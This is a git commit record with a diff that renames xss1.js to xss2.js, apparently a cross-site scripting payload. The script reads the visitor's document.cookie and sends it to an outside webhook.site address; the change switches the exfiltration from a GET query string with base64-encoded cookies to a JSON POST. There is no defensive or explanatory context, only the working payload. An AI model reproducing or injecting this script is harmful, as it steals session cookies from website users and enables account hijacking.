6b5d8e8dcacaff1ad53b762d0798491882f2dcf7
Rodrigo Florian <125144252+RODRIGOF-FG@users.noreply.github.com>
2026-06-19 14:20:17 -0500

    Update and rename xss1.js to xss2.js

--- xss2.js
+++ xss2.js
@@ -1,5 +1,8 @@
 (function(){
 var c=document.cookie;
 var webhook="https://webhook.site/745deb66-8c57-44c5-b5fa-dc355f9453e6";
-fetch(webhook+'?cookies='+btoa(c));
+fetch(webhook, {
+  method: 'POST',
+  body: JSON.stringify({cookies: c})
+});
 })();
